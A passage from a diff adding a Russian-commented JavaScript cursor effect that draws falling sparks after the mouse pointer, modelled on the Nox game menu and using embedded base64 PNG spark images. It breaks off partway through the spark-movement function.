@@ -1,0 +1,500 @@
+// Название: "Nox. Грубейшее подобие курсора главного меню." (да простят нас, русских, буржуинские разработчики)
+// Подпрограмма составлена: Garett
+// Соавтор: Evengard
+// Идея: разработчики Nox-а
+// Версия 1.0.0.2010
+
+
+// Как бы константы
+	var onMoveNum = 10;
+	var togglerImg = new Array("","");
+	var no = 100;											// Кол-во искр, привязанных к курсор
+	var iskrOrig=new Array("1.png","2.png","3.png");	// Виды искр, пути до них - маленький/большой/огромный
+	var iskr=new Array("data:image/png;base64,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","data:image/png;base64,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","data:image/png;base64,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");	// Виды искр, пути до них - маленький/большой/огромный
+	var cliskr = 50;										// Кол-во искр, вылетающих при нажатии кнопки мыши
+	var speed=40;											// Какая-то скорость (configure interval btw flash (1000=1 second)), вероятно время между кадрами, в мс
+	var g = 0.8;											// Ускорение свободного падения (округленное)
+// Какие-то как-бы константы, идентифицирующие текущую страницу
+	var isNetscape = navigator.appName == "Netscape";
+	var isOpera = navigator.appName == "Opera";
+	var isOldAndBuggy = (navigator.userAgent.indexOf("MSIE")>=0 && navigator.userAgent.indexOf("Trident")<0);
+	var doc_width, doc_height;
+	var animated = false;
+// Используемые переменные/массивы
+	var xcoord=0;									// текущая координата курсора
+	var ycoord=0;									// текущая координата курсора
+	var xd = new Array();								// координаты искр
+	var yd = new Array();								// координаты искр
+	var stx = new Array();								// координата отсчета движения искры
+	var sty = new Array();								// координата отсчета движения искры
+	var dd = new Array();								// активность/неактивность искры
+	var vxd = new Array();								// скорость (уравнение) движения искры
+	var vyd = new Array();								// скорость (уравнение) движения искры
+	var grEWxd = new Array();							// граница движения искры - восток, запад
+	var grNyd = new Array();							// граница движения искры - север
+	var grSyd = new Array();							// граница движения искры - юг
+	var dots = new Array();							// массив всех искр, привязанных к курсору
+	var imgs = new Array();							// служебный массив, обозначающий собственно сами картинки искр
+	var imgs0 = new Array();							// служебный массив, обозначающий собственно сами картинки искр первой позиции
+	var imgs1 = new Array();							// служебный массив, обозначающий собственно сами картинки искр второй позиции
+	var imgs2 = new Array();							// служебный массив, обозначающий собственно сами картинки искр третьей позиции
+	var imgPreload = new Image();
+	var workerThread = false;
+	var suspend = false;
+	var freeDots = new Array();
+	var count = new Date();
+	var previousLaunch = count.getTime();
+	var curMouseX = 0;
+	var curMouseY = 0;
+	var prevMouseX = 0;
+	var prevMouseY = 0;
+// Подгружаем картинки
+/*
+	for (var i = 0; i < iskr.length; i++) {
+		imgPreload.src = iskr[i];
+	}
+	for (var i = 0; i < togglerImg.length; i++) {
+		imgPreload.src = togglerImg[i];
+	}
+*/
+// Цикл определения/идентификации каждой искры (установка начальных значений)
+	function iterate2 () {
+		if(!isOldAndBuggy && get_cookie("effects")!="off")
+		{
+			document.getElementById("togglerImg").src=togglerImg[1];
+		}
+		for (var i = 0; i < no; ++ i) {	
+			dots[i] = document.createElement("div");
+			//imgs[i] = document.createElement("img");
+			imgs0[i] = document.createElement("img");
+			imgs1[i] = document.createElement("img");
+			imgs2[i] = document.createElement("img");
+			/*imgs0[i] = document.createElement("div");
+			imgs1[i] = document.createElement("div");
+			imgs2[i] = document.createElement("div");*/
+			//dots[i].appendChild(imgs[i]);
+			dots[i].appendChild(imgs0[i]);
+			dots[i].appendChild(imgs1[i]);
+			dots[i].appendChild(imgs2[i]);
+			document.body.appendChild(dots[i]);
+			dots[i].id='dot'+i;
+			
+			
+			dots[i].setAttribute("style", 'position:absolute;display:none;z-index:100;top:0px;left:0px;width:0px;height:0px; opacity: 100');
+			dots[i].setAttribute("onselectstart", 'return false;');
+			dots[i].setAttribute("ondragstart", 'return false;');
+			
+			//imgs[i].id='iskr'+i;
+			//imgs[i].class='iskr'+i;
+			//imgs0[i].class='iskr'+i;
+			//imgs1[i].class='iskr'+i;
+			//imgs2[i].class='iskr'+i;
+			imgs0[i].id='iskr0-'+i;
+			imgs1[i].id='iskr1-'+i;
+			imgs2[i].id='iskr2-'+i;
+			//imgs[i].src = iskr[0];
+			
+			/*imgs0[i].setAttribute("style", "opacity: 100; background: url("+iskr[0]+") no-repeat; width: 4px; height: 4px");
+			imgs1[i].setAttribute("style", "opacity: 100; background: url("+iskr[1]+") no-repeat; width: 7px; height: 7px");
+			imgs2[i].setAttribute("style", "opacity: 100; background: url("+iskr[2]+") no-repeat; width: 10px; height: 10px");*/
+			
+			imgs0[i].setAttribute("onselectstart", 'return false;');
+			imgs0[i].setAttribute("ondragstart", 'return false;');
+			imgs1[i].setAttribute("onselectstart", 'return false;');
+			imgs1[i].setAttribute("ondragstart", 'return false;');
+			imgs2[i].setAttribute("onselectstart", 'return false;');
+			imgs2[i].setAttribute("ondragstart", 'return false;');
+			
+			imgs0[i].src = iskr[0];
+			imgs1[i].src = iskr[1];
+			imgs2[i].src = iskr[2];
+			imgs0[i].style.display = "block";
+			imgs1[i].style.display = "none";
+			imgs2[i].style.display = "none";
+			xd[i] = 0;
+			yd[i] = 0;
+			stx[i] = 0;
+			sty[i] = 0;
+			dd[i] = 0;
+			vxd[i] = 10;
+			vyd[i] = 10;
+			grEWxd[i] = 0;
+			grNyd[i] = 0;
+			grSyd[i] = 0;
+			
+			freeDots[i]=i;
+		}
+		// get size of window
+		if (isNetscape) {
+			doc_width = window.innerWidth + window.pageXOffset;
+			doc_height = window.innerHeight + window.pageYOffset;
+		} 
+		/*else if (isOpera) {
+			doc_width = document.body.scrollLeft;
+			doc_height = document.body.scrollTop;
+		} */
+		else {
+			doc_width = document.body.clientWidth + document.body.scrollLeft;
+			doc_height = document.body.clientHeight + document.body.scrollTop;
+		}
+	}
+// Функция возвращает случайным образом: '1' или '-1'
+	
+/*	function RndMinus () {
+		var k = -1;
+		for (var j = 0; j < 10*Math.random(); j++) {
+			k = (-1)*k;
+		}
+		return k;
+	}*/
+	
+// Движение по координате абцисс, возвращает перемещение по горизонтали
+	function ddx (inum) {
+		var dx = 0;
+		dx = vxd[inum];
+		return dx;
+	}
+	
+// Движение по координате ординат, возвращает перемещение по вертикали
+	function ddy (inum) {
+		var dy = 0;
+		dy = vyd[inum]+g*g/2;
+		vyd[inum] = vyd[inum]+g;
+		return dy;
+	}
+	
+// Функция оределения возможности движения искры (отслеживает достижение границы области перемещения искры)
+// Возвращает:
+//	'1' - искра должна двигаться далее
+//	'0' - искра должна гаснуть
+	function BVerker (bnum, bdx, bdy) {
+		if (((((stx[bnum]-xd[bnum]) < grEWxd[bnum]) && (((stx[bnum]-xd[bnum]) >= 0))) || (((xd[bnum]-stx[bnum]) < grEWxd[bnum]) && (((xd[bnum]-stx[bnum]) >= 0)))) && ((((sty[bnum]-yd[bnum]) < grNyd[bnum]) && (((sty[bnum]-yd[bnum]) >= 0))) || (((yd[bnum]-sty[bnum]) < grSyd[bnum]) && (((yd[bnum]-sty[bnum]) >= 0))))) {
+			if (((xd[bnum]+bdx)<doc_width) && ((xd[bnum]+bdx)>=0)) {
+				if ((yd[bnum]+bdy)<doc_height) {
+					return 1;
+				} else {
+					return 0;
+				}
+			} else {
+				return 0;
+			}
+		} else {
+			return 0;
+		}
+	}
+	
+// Расчет координат искры и её собственные изменения, при движении курсора
+	function CurVerker (inum) {
+	// расчет предполагаемых перемещений ("физический")
+		var dx = ddx(inum);
+		var dy = ddy(inum);
+	// расчет перемещений с учетом границ движения
